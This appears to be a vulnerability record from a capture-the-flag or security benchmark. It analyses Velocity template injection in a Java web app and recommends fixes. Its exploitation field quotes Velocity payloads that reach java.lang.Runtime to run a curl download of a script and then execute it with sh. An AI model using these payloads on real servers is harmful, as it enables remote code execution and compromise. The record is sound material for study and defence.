vulnerabilities.name: Apache Velocity Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)
vulnerabilities.description: The web application accepts user input via the 'text' query parameter, substitutes it directly into an HTML template via `String.replace("TEXT", replacement)`, and then passes the entire template string to the Apache Velocity templating engine for parsing and rendering. Since the user input is injected BEFORE Velocity parsing, an attacker can inject arbitrary Velocity template directives (e.g., `#set()`, `$` references) to achieve Remote Code Execution. This is confirmed by the official solver script (solver.py) which uses this exact vulnerability to execute arbitrary shell commands on the server.
vulnerabilities.source: HTTP GET/POST parameter `text` (line 21: `@RequestParam(required = false, name = "text") String textString`)
vulnerabilities.sink: Velocity template engine parsing (line 41: `runtimeServices.parse(reader, "home")`) and merging (line 47: `t.merge(context, writer)`)
data_flow: Step 1: User input received via `text` parameter at Main.java line 21
Step 2: Input passed to `readFileToString()` at line 29
Step 3: Inside `readFileToString()`, input is substituted into template via `line.replace("TEXT", replacement)` at line 66
Step 4: The modified template string is returned and wrapped in a StringReader at line 35
Step 5: Velocity engine parses the template via `runtimeServices.parse(reader, "home")` at line 41 - user's Velocity directives are now parsed as code
Step 6: Template is executed via `t.merge(context, writer)` at line 47 - arbitrary code execution occurs
vulnerabilities.exploitation: The attacker sends a POST request to '/' with the 'text' parameter containing Velocity template directives. The solver.py demonstrates two exploitation steps: (1) inject `#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime()) #set($process=$runtime.exec("curl ... -o /a.sh"))` to download a script, then (2) inject `#set($process=$runtime.exec("sh /a.sh"))` to execute it. The Velocity directives use Java reflection to access `java.lang.Runtime.getRuntime()` and execute arbitrary OS commands. The output of the command is captured via `$bufferedReader.lines().collect(...)` and rendered in the HTTP response.
vulnerabilities.impact: Full remote code execution on the server. An attacker can execute arbitrary shell commands, read any file (including /flag*.txt), install malware, pivot to internal networks, or completely compromise the server.
vulnerabilities.fix_recommendation: Never allow user input to be concatenated into template strings before parsing. Use a proper template engine API that separates code from data. Options include: (1) Use Velocity's context to pass user data as variables (e.g., `context.put("userText", textString)`) and reference them in the template as `$userText` instead of using `String.replace()`. (2) HTML-encode or escape user input before inserting it into the template. (3) Switch to a template engine that auto-escapes by default (e.g., Thymeleaf with Spring Boot).
